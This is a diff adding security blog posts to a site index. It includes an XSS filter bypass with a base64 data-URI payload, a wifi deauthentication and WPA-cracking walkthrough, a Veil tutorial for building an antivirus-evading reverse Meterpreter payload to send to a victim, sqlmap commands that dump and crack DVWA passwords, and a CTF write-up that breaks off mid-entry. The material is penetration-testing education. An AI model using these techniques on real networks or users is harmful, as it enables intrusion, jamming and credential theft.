@@ -9,7 +9,7 @@
   <meta name="author" content="Matt">
 
   
-  <meta name="description" content=" Tweet Test Apr 10th, 2014 Tweet Reboot Apr 10th, 2014 Migration from the old site in progress&hellip; ">
+  <meta name="description" content="Tweet Test Apr 10th, 2014 Tweet Reboot Apr 10th, 2014 Migration from the old site in progress&hellip; Tweet LUKS Nuke New to Kali 1.0.6 An emergency &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -192,8 +192,607 @@
 
     </article>
   
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2014/01/17/luks-nuke-new-to-kali-1-0-6/">LUKS Nuke New to Kali 1.0.6</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-01-17T00:00:00-05:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p>An emergency LUKS self-destruct functionality was recently added to Kali v1.0.6. The way this works is by setting two unique decryption passwords; one password will decrypt the data on the drive and allow for normal use and the other password will &#8220;destroy&#8221; the data on the drive. It is fairly easy to configure and a lot of people are excited about it. More information on the feature can be found on the <a href="http://www.kali.org/how-to/emergency-self-destruction-luks-kali/" target="_blank">Kali website</a>.</p>
+<p>However, I&#8217;m a bit skeptical about this. The way I look at it, this will stop only the laziest and least skilled individuals. Think about it this way, if I were to seriously seize/steal/inspect a laptop with this feature, the first thing I would do is make a copy of the drive. If you provided me the nuke password, I&#8217;d say that it didn&#8217;t work and revert to the initial image and start again.</p>
+<p>More aggressively, if the owner is abducted or the laptop is seized, I see two outcomes:</p>
+<ul>
+<li>The owner gives the criminal the nuke password, destroys the data, and is subsequently beaten/killed.</li>
+<li>The owner gives an LEO the nuke password, destroys the data, and catches an obstruction of justice charge (<a href="http://www.law.cornell.edu/uscode/text/18/1519">federally punishable up to 20 years</a>).</li>
+</ul>
+<p>So what threat is this really protecting against?</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+
+  
+  
+
+
+    </article>
+  
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2014/01/04/bypassing-xss-filters-using-data-uris/">Bypassing XSS Filters Using Data URIs</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-01-04T00:00:00-05:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p>One of the web app testers on a team I work with shared a technique for bypassing XSS filters that I hadn&#8217;t used (although admittedly I don&#8217;t get much hands-on time with web apps anymore) &#8211; using data uniform resource identifiers (URIs). Data URIs are defined by <a href="http://tools.ietf.org/html/rfc2397">RFC 2397</a> and can be used to embed file in an HTML document without referencing a file stored on the server.</p>
+<p>The way this works is by allowing the data to be self-contained within the URI and if a valid MIME type is specified, the data will be rendered. If a MIME type is not specified, it will default to text/plain which would be okay for textualized data, however to embed binary data one would need to specify base64 in the string. The syntax is as follows:</p>
+<pre>&lt;img src="data:[MIMEtype];base64,[DATA]"&gt;</pre>
+<p>So to embed this PNG</p>
+<p style="text-align: left;"><a href="http://www.cubalo.com/blog/wp-content/uploads/2014/01/glider.png"><img class="size-full wp-image-246" alt="glider" src="http://www.cubalo.com/blog/wp-content/uploads/2014/01/glider.png" width="55" height="55" /></a></p>
+<p>using the method shown, the string would be</p>
+<pre>&lt;img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADcAAAA3CAAAAACNsI2aAAAACXBIWXMAAAB5AAAAeQBPsriEAAAB6ElEQVR42rVWO46EMAzNadAcY3vaOQMXoXcXKZehS8NpqNxamw8JxDYra1Zjhgge9jhx/By7bYvtl4Y8Qn+tEjty6WxuQ0KkfOM5wJEeEkT1bsigU+xGQV+QfZ2ned0LAkLnyQ4XV2XB/k+jXdTs8Mc1+UlvQehEt5Fit7hLFsUfqfOk3d1lJ9VO+qN1sFvJm+IScB7s3uo8ZVzC8RrsXjIuqp2n0d+sxFNbHxCw9cF34yn2L5jyJWndIprzRfqLpvw0+6PCh1fjgxpP5NL4VzlYEa6zOYDgzyvk0cMbykMek6THipSXAD5/BKh8H/3JGZTxPgM9Px9WDL0CkM1ORJie48nsWAXQ8kW1YxlknKfIWJs/EBXgoZ6Jf2KMNMYz4FgBJjTGkxR/H67vm/H8eP9ShlyRqfli24c0svy0zLNXgOkNtQJEle/P/MPOv8T3TGZIZIbO7sL7BMON74nkuQqUj4XvnMvwiNCBjO+yev2NVDtZLeX5rvD9lu0zauxW+a6dBvJ8H5Gyfzz3wIBkO57rYECyHeeWF+xW+YcT47Jkdzi4TpT+lPNdIv9Z34fxNOxf0PhO91yw5MuMen56AxLPOtG7W9T63SCQ2k9Uol1so3bVnrog2JTyU57n1bb37n3s5s8Of5RfsaTdSlfuyUAAAAA8dEVYdGNvbW1lbnQAIEltYWdlIGdlbmVyYXRlZCBieSBHTlUgR2hvc3RzY3JpcHQgKGRldmljZT1wbm1yYXcpCvqLFvMAAABKdEVYdHNpZ25hdHVyZQA4NWUxYWU0YTJmYmE3OGVlZDRmZDhmMGFjZjIzNzYwOWU4NGY1NDk2Y2RlMjBiNWQ3NmM5Y2JjMjk4YzRhZWJjJecJ2gAAAABJRU5ErkJggg=="&gt;</pre>
+<p>Taking advantage of this feature, an attacker can inject their XSS code into the page. In the case of a system that blocks specific strings like &#8220;script&#8221; or symbols like parentheses, this method can be used to disguise the payload and evade the protections. An example of this using the default &#8220;&lt;script&gt;alert(&#8220;XSS&#8221;);&lt;/script&gt;&#8221; payload would be:</p>
+<pre>&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg=="&gt;</pre>
+<p>HTML tags that are able to carry these payloads are</p>
+<ul>
+<li>IFRAME</li>
+<li>Object</li>
+<li>Anchor</li>
+<li>Image</li>
+</ul>
+<p><span style="line-height: 1.5em;">There are some limitations to this technique though. Most modern browsers support the use of data URIs, however Internet Explorer &lt; 8 does not. IE8 now has support for URIs but only with CSS. Using CSS is not much more difficult than with HTML. Using the image provided above for example, a CSS version would be:</span></p>
+<pre>li { 
+  background: 
+    url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADcAAAA3CAAAAACNsI2aAAAACXBIWXMAAAB5[snip...]) 
+    no-repeat 
+    left center;
+  padding: 5px 0 5px 25px;
+}</pre>
+<p><strong>Resources:</strong></p>
+<ul>
+<li>http://css-tricks.com/data-uris/</li>
+<li>http://tools.ietf.org/html/rfc2397</li>
+<li>https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</li>
+<li>http://palizine.plynt.com/issues/2010Oct/bypass-xss-filters/</li>
+<li>http://www-archive.mozilla.org/quality/networking/testing/datatests.html</li>
+</ul>
+
+  
+  
+
+
+    </article>
+  
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2013/12/13/50-shades-of-red-stories-from-the-playroom/">50 Shades of RED: Stories From the &#8220;Playroom&#8221;</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-12-13T00:00:00-05:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p>http://www.youtube.com/watch?v=bRqsdBSVM-g</p>
+
+  
+  
+
+
+    </article>
+  
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2013/12/07/deauthing-wireless-clients/">Deauthing Wireless Clients</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-12-07T00:00:00-05:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p>This year at DEFCON, the <a href="http://mobile.slashdot.org/story/13/08/06/0042256/wi-fi-pineapple-hacking-device-sells-out-at-def-con">Hak5 WiFi Pineapples sold out within the first day</a>. I noticed quite a few people walking around with their Pineapples on in Vegas and I&#8217;m sure a few of them were having some luck, but they only work against people attempting to connect to a network, not those who are already connected. So what if we could force those people already connected to drop the connection and try to reconnect? That&#8217;s where a deauth attack is valuable. By deauthenticating the clients and forcing them to reconnect, we can do three things:</p>
+<ol>
+<li>Denial of service.</li>
+<li>Redirect to our rogue access point (Pineapple, PwnPlug, SILICA, etc.).</li>
+<li>Capture the WPA handshake and attempt to crack the  password.</li>
+</ol>
+<p>Actually doing a deauth attack is really simple. I have a cheap laptop with Kali running on it and an Alfa card setup and this works perfectly. The first thing to do is to set up an interface in monitoring mode using airmon.</p>
+<pre>airmon-ng start wlan1</pre>
+<p>This creates the mon0 interface that we&#8217;ll use throughout the rest of the attack.</p>
+<p>Next we need to grab some information about the target network. Do this with airodump</p>
+<pre>airodump-ng mon0</pre>
+<p>Grab the BSSID and channel number of the target network. Change your interface over to the channel of the target</p>
+<pre>iwconfig mon0 channel X</pre>
+<p>and we&#8217;ll be ready to start the attack.</p>
+<p>To begin deauthing clients, we&#8217;ll need to use aireplay. The syntax is:</p>
+<pre>aireplay-ng -0 0 -a 00:00:00:00:00:00 mon0</pre>
+<ul>
+<li>-0 specifies a deauth attack</li>
+<li>-a is the BSSID of the target</li>
+<li>mon0 is your monitoring interface</li>
+</ul>
+<p>When you run this, it will send out deauthentication packets to the network, knocking off clients until you stop it.</p>
+<pre>root@kali:~# aireplay-ng -0 0 -a XX:XX:XX:XX:XX:XX mon0
+11:37:23  Waiting for beacon frame (BSSID: XX:XX:XX:XX:XX:XX) on channel X
+NB: this attack is more effective when targeting
+a connected wireless client (-c &lt;client's mac&gt;).
+12:37:23  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:23  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:24  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:24  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:25  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:25  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:26  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:26  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:27  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:27  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]
+12:37:27  Sending DeAuth to broadcast -- BSSID: [XX:XX:XX:XX:XX:XX]</pre>
+<p>Now the challenge is redirecting those deauthenticated clients to your access point. To do this, have your Pineapple with you and running, or set up another device with the SSID of the target network (assuming you can get your signal stronger than the existing access point) or to the SSID of a common network such as:</p>
+<ul>
+<li>linksys</li>
+<li>guest</li>
+<li>NETGEAR</li>
+<li>cisco</li>
+<li>attwifi (Starbucks)</li>
+<li>hhonors (Hilton Hotel)</li>
+</ul>
+<p>Another option is to capture the WPA/2 handshake with the client reconnects. You can use this to attack the password of the AP in order to get a foothold in the network. To do this, in another terminal have this command typed and ready to go:</p>
+<pre>airodump-ng mon0 --bssid XX:XX:XX:XX:XX:XX --channel X --write WPAhandshake</pre>
+<p>As soon as you stop sending deauth packets, run that command and wait for the top to have the &#8220;WPA handshake: XX:XX:XX:XX:XX:XX&#8221; value. From there, run aircrack with your wordlist of choice to attemp to crack the password.</p>
+<pre>aircrack-ng WPAhandshake.cap -w /usr/share/wordlists/fern-wifi/common.txt</pre>
+<p>Finally, a different way of using this attack is to create a jammer. Note that <a href="http://transition.fcc.gov/eb/jammerenforcement/jamfaq.pdf">any kind of jammer in the United States is absolutely illegal</a>, so don&#8217;t do this. I stumbled across <a href="https://code.google.com/p/wifijammer/">this</a> project which essentially does the same thing as aireplay, but against all APs running on a given channel. I have not tested this so I can not verify that it actually works, however to concept is valid.</p>
+
+  
+  
+
+
+    </article>
+  
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2013/12/02/bug-fix-binwalk-global-name-plugins-is-not-defined/">Bug Fix: Binwalk &#8220;Global Name &#8216;Plugins&#8217; Is Not Defined&#8221;</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-12-02T00:00:00-05:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p>Recently, while trying to work with binwalk on a fresh Kali 1.0 build, I came across this error:</p>
+<pre>root@kali:~/Desktop/# binwalk XXXXXXX.bin
+Traceback (most recent call last):
+  File "/usr/bin/binwalk", line 536, in &lt;module&gt;
+    main()
+  File "/usr/bin/binwalk", line 481, in main
+    plugins_blacklist=plugin_blacklist)
+  File "/usr/lib/pymodules/python2.7/binwalk/__init__.py", line 306, in scan
+    self.plugins = Plugins(self, whitelist=plugins_whitelist, blacklist=plugins_blacklist)
+NameError: global name 'Plugins' is not defined</pre>
+<p>It looks like the binwalk.plugins module is referencing something that Python doesn&#8217;t recognize, so to fix this issue, remove the following files:</p>
+<pre>/usr/lib/pymodules/python2.7/binwalk/__init__.py
+/usr/lib/pymodules/python2.7/binwalk/__init__.pyc</pre>
+<p>If that still doesn&#8217;t work (or you&#8217;re using Python 2.6), remove:</p>
+<pre>/usr/lib/pymodules/python2.6/binwalk/__init__.py
+/usr/lib/pymodules/python2.6/binwalk/__init__.pyc</pre>
+
+  
+  
+
+
+    </article>
+  
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2013/11/30/avlol/">#avlol</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-11-30T00:00:00-05:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p>Veil, an antivirus evasion tool, created by Chris Truncer, Mike Wright, and The Grayhound was recently added to the Kali repositories. The developers presented it at NoVA Hackers some weeks ago and it really sparked my interest. I haven&#8217;t had much opportunity to test the payloads it creates, however I have heard of numerous successes with it.</p>
+<p>Before we get started, <strong>PLEASE</strong> do not submit your payloads to VirusTotal!</p>
+<h2>Installation</h2>
+<p>Since Veil is now in the Kali repositories, a simple apt-get will install it for you.</p>
+<pre>apt-get update &amp;&amp; apt-get install veil</pre>
+<p>This method, however, does not ensure that you are using the bleeding-edge release of Veil, so you can also pull the project down from Github.</p>
+<pre>git clone https://github.com/veil-evasion/Veil.git
+cd Veil/setup/
+./setup.sh</pre>
+<h2>Creating a Windows payload</h2>
+<p>Once installed, start Veil (veil for the apt-get method, ./Veil.py for git). This will load the framework and its current 20 payloads. For the sake of simplicity, we will create a reverse_tcp Meterpreter payload.</p>
+<p>First, list all of the available payloads.</p>
+<pre>list</pre>
+<p>This will show the available payload names and their rating. For more information on a payload, type:</p>
+<pre>info $num</pre>
+<p>where the $num is the number next to the payload.</p>
+<p>Choose number 13, python/AESEncrypted.</p>
+<p>The options are set similarly to Metasploit, so this should be old-hat. If you&#8217;d like to use pyherion, for example, the syntax would be:</p>
+<pre>set use_pyherion Y</pre>
+<p>Now type generate to start generating the payload. The next section will allow you to choose a source for your shellcode. You can either use msfvenom or provide your custom shellcode. Here, we&#8217;ll opt for msfvenom.</p>
+<p>Hit Enter to select the windows/meterpreter/reverse_tcp payload. Again, you can use whatever payload you&#8217;d like. Now, enter the LHOST address (where you want the connection to come back to) and the LPORT number (port to connect back on). Finally, you can enter any other msfvenom options in OPTION=value syntax, but we&#8217;ll skip that for now.</p>
+<p>Once you hit Enter, it will generate your shellcode and prompt you to name your payload. Obviously you can change this to whatever you want at a later time, so just name it something easy to remember for the time being. Then you will be prompted to select the method for creating the executable (in this case Pyinstaller or Py2Exe). Choose Pyinstaller and run.</p>
+<p>The payload is now created and a bit of information about it is shown in the terminal. The executable will be dropped in ~/veil-output/sources/ and an RC file will be dropped in ~/veil-output/handlers/</p>
+<h2>Receiving sessions</h2>
+<p>As you may have noticed in the last section, Veil makes an RC file when the payload is generated. This will be used with Metasploit to set up a handler to listen for incoming connections.</p>
+<p>To set up the handler, navigate into the handler directory (~/veil-output/handlers/) and run this command with your handler name substituted:</p>
+<pre>msfconsole -r payload_handler.rc</pre>
+<p>The handler will be running as a background job awaiting the callback from the payload.</p>
+<p>Finally, send the payload out to your victim via your method of choice. Once they click it and it executes, you will have your standard meterpreter session and you can start post exploitation and/or pivoting.</p>
+<h2>More information</h2>
+<p>There are numerous guides posted the Veil website showing exactly how to use this method and numerous others to create payloads. The devopers are also on Twitter, @ChrisTruncer @TheMightyShiv @the_grayhound</p>
+<p>https://www.veil-evasion.com/guidesvideos/</p>
+
+  
+  
+
+
+    </article>
+  
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2013/11/23/sqlmap-basics-vs-dvwa/">Sqlmap Basics (vs. DVWA)</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-11-23T00:00:00-05:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p>I&#8217;ve been insanely busy with work for the past few weeks so I&#8217;ve been neglecting the site a bit. In the past I&#8217;ve done a lot of web app testing, but as of late is has become a rare occurrence so I need to make sure I keep my skills up. Usually, I fire up Web Security Dojo and mess around a bit with WebGoat/Gruyere/DVWA. This time I thought I would actually put my thoughts and process into words and share it. In this tutorial, I will demonstrate how to use sqlmap to get SQL injection on DVWA under the medium security settings.</p>
+<h2>Setup</h2>
+<p>Start up a VM running something with DVWA (Dojo, Metasploitable, etc.) then login to the app (default credentials are admin:password). On the bottom-left side of the page will be a menu option titled &#8220;DVWA Security&#8221;. Click that and change the Script Security to &#8220;medium.&#8221; This doesn&#8217;t really matter since we will be using sqlmap to do the heavy lifting.</p>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_1.png"><img class="alignnone size-medium wp-image-211" alt="sqlmap_1" src="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_1-300x244.png" width="300" height="244" /></a></p>
+<h2>Gathering Info</h2>
+<p>Next, fire up Burp Suite, start the proxy with Intercept turned off, and tell your browser to go through it (using the Foxy Proxy browser plugin is the easiest).</p>
+<p>In the browser, click the &#8220;SQL Injection&#8221; challenge from the menu on the left side of the page. Once the page is loaded, there will be a text box to search a user ID. Go back into Burp and turn on Intercept. In the browser, enter 1 into the box. This will return the information for the user with ID 1, admin. You&#8217;ll notice that the page isn&#8217;t loading. This is because Burp is intercepting the communication. Open up the Burp window and notice the GET request. From here, we want to grab the destination and cookie value and save it for later.</p>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_2.png"><img class="alignnone size-medium wp-image-212" alt="sqlmap_2" src="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_2-300x121.png" width="300" height="121" /></a></p>
+<p>Click the Forward button until the page is loaded and turn off Intercept. Now go back the browser and you&#8217;ll see the SQLi page is loaded and showing the details for the user &#8220;admin.&#8221;</p>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_3.png"><img class="alignnone size-medium wp-image-213" alt="sqlmap_3" src="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_3-300x146.png" width="300" height="146" /></a></p>
+<p>This shows that the information we enter into the text box is what is being queried in the database, so this will be our target for injection.</p>
+<h2>Dumping users and passwords</h2>
+<p>In a terminal, we need to provide sqlmap with the options it needs to attack the app. The command you will want to enter is:</p>
+<pre>sqlmap -u "http://192.168.1.111/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit" --cookie="security=medium ; PHPSESSID=4c74cbff87f966532a7111ba2480620f" --dbs</pre>
+<p>The structure of this command is as follows.</p>
+<ul>
+<li>-u  = Host (mine is 192.168.1.111) + Path (/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit)</li>
+<li>&#8211;cookie = Both of the cookies we captured in Burp. You will need two, security and PHPSESSID.</li>
+<li>&#8211;dbs = Enumerate databases</li>
+</ul>
+<p>When running, choose to continue with whatever sqlmap asks you. It will find that the &#8216;id&#8217; parameter is vulnerable and ask if you want to keep testing others. Choose &#8220;N.&#8221; Once completed, it will display the injection points (mine showed 4 types) and the available databases.</p>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_4.png"><img class="alignnone size-medium wp-image-214" alt="sqlmap_4" src="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_4-300x160.png" width="300" height="160" /></a></p>
+<p>From here, we need to select what database we want to go after. For this example, we&#8217;ll hit &#8220;dvwa.&#8221; So now, in sqlmap we need to find out the tables in the database. To do this, we need to modify the options a little bit. Remove the &#8211;dbs option and add &#8220;-D dvwa &#8211;tables&#8221; to make the new command:</p>
+<pre>sqlmap -u "http://192.168.1.111/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit" --cookie="security=medium ; PHPSESSID=4c74cbff87f966532a7111ba2480620f" -D dvwa --tables</pre>
+<p>This will show us the tables, guestbook and users.</p>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_5.png"><img class="alignnone size-medium wp-image-215" alt="sqlmap_5" src="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_5-300x160.png" width="300" height="160" /></a></p>
+<p>Next we&#8217;ll dump the columns from the table. Do this by removing the &#8220;&#8211;tables&#8221; option from the command and add &#8220;-T users &#8211;columns&#8221; and run it.</p>
+<pre>sqlmap -u "http://192.168.1.111/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit" --cookie="security=medium ; PHPSESSID=4c74cbff87f966532a7111ba2480620f" -D dvwa -T users --columns</pre>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_6.png"><img class="alignnone size-medium wp-image-216" alt="sqlmap_6" src="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_6-300x160.png" width="300" height="160" /></a></p>
+<p>We can see that there are some interesting values in this table, so we definitely want to dump this. A cool option sqlmp provides us with is the ability to bruteforce password hashes during the dump. During the next and final command, we will have the option to crack the hashes so make sure to approve it when it pops up (the default dictionary, option 1, works just fine). The final command to dump the table&#8217;s data is:</p>
+<pre>sqlmap -u "http://192.168.1.111/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit" --cookie="security=medium ; PHPSESSID=4c74cbff87f966532a7111ba2480620f" -D dvwa -T users --dump</pre>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_7.png"><img class="alignnone size-medium wp-image-217" alt="sqlmap_7" src="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_7-300x160.png" width="300" height="160" /></a></p>
+<p>When it is done cracking, we will have all of the passwords for DVWA, including the admin user.</p>
+<h2>Conclusion</h2>
+<p>Obviously, we were attacking an extremely vulnerable web application in this tutorial, however sqlmap provides a ton of options to tailor the command to your needs for the more challenging tests. I have found that during a normal assessment, sqlmap can prove to be very useful, however do not expect it to be a skeleton key for all databases you come across. For example, by changing the Script Security to &#8220;high&#8221; in DVWA, restrictions are placed on the &#8216;id&#8217; parameter which was found to be injectable on the medium security setting, making it non-injectable using the method in this tutorial.</p>
+<p><a href="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_8.png"><img class="alignnone size-medium wp-image-218" alt="sqlmap_8" src="http://www.cubalo.com/blog/wp-content/uploads/2013/11/sqlmap_8-300x116.png" width="300" height="116" /></a></p>
+<p>(Notice the &#8220;$id = stripslashes($id);&#8221; and if statement checking if the $id value is numeric.)</p>
+<p>Also, don&#8217;t forget to turn off your machine or VM running your vulnerable app when you are done!</p>
+
+  
+  
+
+
+    </article>
+  
+  
+    <article class="post">
+      <div class="sharing-box">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://cubalo.github.io/index.html" data-via="mchandx" data-counturl="http://cubalo.github.io/index.html" data-size="large">Tweet</a>
+  
+  
+  
+</div>
+
+      
+  <header>
+    
+      <h2 class="entry-title">
+        
+        <a href="/blog/2013/10/01/csaw-ctf-2013-writeup/">CSAW CTF 2013 Writeup</a>
+        
+      </h2>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-10-01T00:00:00-04:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <p>NYU-Poly&#8217;s Cyber Security Awareness Week (CSAW) Capture the Flag (CTF) event was held this year from September 19-22. This CTF is geared towards undergrads looking to break into security, however the event provides some decent challenges for professionals.</p>
+<p>Unfortunately, I wasn&#8217;t able to dedicate as much time to the contest as I would have like to due to some personal obligations but I was able to knock out quite a few challenges. The solutions and explanations follow.</p>
+<h3>Trivia 1 – 50 points</h3>
+<p><strong>Challenge</strong>: &#8220;Drink all the booze, ____ all the things!&#8221;<br />
+<strong>Answer</strong>: hack<br />
+<strong>Explanation</strong>: Lyrics from Dual Core’s “All The Things.” <a href="http://www.youtube.com/watch?v=FoUWHfh733Y">http://www.youtube.com/watch?v=FoUWHfh733Y</a></p>
+<h3>Trivia 2 – 50 points</h3>
+<p><strong>Challenge</strong>: &#8220;What is the abbreviation of the research published in the Hackin9 issue on nmap by Jon Oberheide, Nico Waisman, Matthieu Suiche, Chris Valasek, Yarochkin Fyodor, the Grugq, Jonathan Brossard, and Mark Dowd?&#8221;<br />
+<strong>Answer</strong>: DICKS<br />
+<strong>Explanation</strong>: The title of the Hackin9 article was “Nmap: The Internet Considered Harmful - DARPA Inference Cheking Kludge Scanning”<br />
+<a href="http://www.theregister.co.uk/2012/10/05/hakin9_silliness/">http://www.theregister.co.uk/2012/10/05/hakin9_silliness/</a></p>
+<h3>Trivia 3 – 50 points</h3>
+<p><strong>Challenge</strong>: &#8220;What is the common name for a single grouping of instructions used in a Return Oriented Programming payload, typically ending in a return (ret) instruction?&#8221;<br />
+<strong>Answer</strong>: gadget<br />
+Explanation: <a href="http://en.wikipedia.org/wiki/Return-oriented_programming">http://en.wikipedia.org/wiki/Return-oriented_programming</a></p>
+<h3>Trivia 4 – 50 points</h3>
+<p><strong>Challenge</strong>: &#8220;What is the new web technology that provides a web browser full-duplex communication to a web server over a single connection?&#8221;<br />
+<strong>Answer</strong>: WebSocket<br />
+<strong>Explanation</strong>: <a href="http://www.websocket.org/aboutwebsocket.html">http://www.websocket.org/aboutwebsocket.html</a></p>
+<h3>Trivia 5 – 50 points</h3>
+<p><strong>Challenge</strong>: &#8220;What is the x86 processor operating mode for running 64-bit code?&#8221;<br />
+<strong>Answer</strong>: long mode<br />
+<strong>Explanation</strong>: <a href="http://wiki.osdev.org/X86-64#Long_Mode">http://wiki.osdev.org/X86-64#Long_Mode</a></p>
+<h3>Web 1 – 100 points</h3>
+<p><strong>Challenge</strong>: This challenge required you to &#8220;guess&#8221; the password for the admin user.<br />
+<strong>Answer</strong>: told_ya_you_wouldnt_guess_it<br />
+<strong>Method</strong>: Using a proxy such as Burp, intercept the POST when logging in and change the cookie value to “admin=true”. Once logged in, the flag will be presented.</p>
+<h3>Exploitation1 – 100 points</h3>
+<p><strong>Challenge</strong>: An IP address and a port were provided as well as two files.<br />
+<strong>Answer</strong>: 7c1fbb502632bffa6e62ba6fa847681f<br />
+<strong>Method</strong>: Netcat to the IP/Port specified in the challenge description and then send data greater than 4096 bytes (I used A’s). This will return the flag and close the connection.</p>
+<h3>Misc. 1 – 50 points</h3>
+<p><strong>Challenge</strong>: A PCAP file was provided.<br />
+<strong>Answer</strong>: d316759c281bf925d600be698a4973d5 –<br />
+<strong>Method</strong>: The PCAP includes Telnet traffic, so using Wireshark I followed the TCP stream and the flag was in the traffic.</p>
+<h3>Misc. 2 – 50 points</h3>
+<p><strong>Challenge</strong>: 2 files were provided, networking.pcap and networking.pcap.process<br />
